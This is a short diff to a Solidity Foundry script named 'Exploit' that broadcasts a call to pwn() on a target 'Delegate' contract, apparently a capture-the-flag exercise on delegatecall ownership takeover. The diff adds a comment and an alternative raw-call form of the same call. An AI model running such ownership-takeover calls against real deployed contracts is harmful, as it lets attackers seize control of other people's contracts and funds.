@@ -105,7 +105,12 @@ contract Exploit is Script, HelperFunctions {
         IDelegate targetContract = IDelegate(targetContractAddress);
 
         vm.startBroadcast();
+        // Using interface:
         targetContract.pwn();
+
+        // Without interface:
+        // targetContractAddress.call(abi.encodeWithSignature("pwn()"));
+
         vm.stopBroadcast();
     }
 }
